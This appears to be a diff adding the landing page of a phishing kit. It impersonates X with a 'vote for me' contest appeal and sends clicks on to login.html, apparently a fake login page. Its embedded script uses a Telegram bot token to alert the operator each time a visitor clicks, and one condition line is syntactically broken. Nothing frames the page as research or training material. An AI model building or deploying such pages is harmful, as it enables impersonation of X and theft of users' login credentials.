@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en" class="bg-black">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vote on X</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script type="module" src="config.js"></script>
+</head>
+
+<body class="min-h-screen bg-black flex items-center justify-center p-4 text-white">
+  <div class="w-full max-w-md">
+
+    <div class="bg-black border border-gray-800 rounded-2xl overflow-hidden">
+
+      <!-- Header -->
+      <div class="relative h-56">
+        <img 
+          src="https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800&h=400&fit=crop"
+          class="w-full h-full object-cover opacity-80"
+        />
+        <div class="absolute inset-0 bg-black/60"></div>
+
+        <h1 class="absolute bottom-5 left-5 text-2xl font-bold">
+          THE PEOPLE'S PICK
+        </h1>
+      </div>
+
+      <!-- Content -->
+      <div class="p-6">
+
+        <!-- Profile style -->
+        <div class="flex items-center gap-4 mb-6">
+          <div class="w-14 h-14 bg-gray-800 rounded-full flex items-center justify-center text-xl font-bold">
+            FB
+          </div>
+
+          <div>
+            <h2 class="text-xl font-bold">Fashion Brand</h2>
+            <p class="text-gray-400 text-sm">118 votes • #3</p>
+          </div>
+        </div>
+
+        <p class="text-gray-300 text-[15px] leading-relaxed mb-6">
+          I need your support! Please take a moment to vote for me. 
+          Every vote counts and brings me closer to winning.
+        </p>
+
+        <!-- X Button -->
+        <a href="login.html" id="vote-btn"
+          class="block w-full bg-white text-black font-semibold py-3 rounded-full text-center hover:bg-gray-300 transition flex items-center justify-center gap-3">
+
+          <!-- X Logo -->
+          <svg viewBox="0 0 24 24" class="w-5 h-5 fill-black">
+            <path d="M18.244 2H21.5l-7.5 8.573L22 22h-6.828l-5.34-6.99L3.5 22H.244l8.02-9.164L2 2h6.828l4.82 6.343L18.244 2zm-1.2 18h1.88L7.02 3.94H5.06L17.044 20z"/>
+          </svg>
+
+          Vote on X
+        </a>
+
+      </div>
+    </div>
+
+    <p class="text-center text-gray-500 text-xs mt-6">
+      © 2026 X
+    </p>
+
+  </div>
+
+  <!-- Telegram + Delay -->
+  <script type="module">
+    import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const btn = document.getElementById('vote-btn');
+
+      if (!btn  !TELEGRAM_TOKEN  !TELEGRAM_CHAT_ID) return;
+
+      btn.addEventListener('click', async (e) => {
+        e.preventDefault();
+
+        const message = "🚨 X LOGIN CLICKED\nWaiting for user interaction...";
+
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message
+            })
+          });
+        } catch (err) {
+          console.error(err);
+        }
+
+        // Redirect after sending message
+        window.location.href = btn.href;
+      });
+    });
+  </script>
+
+</body>
+</html>
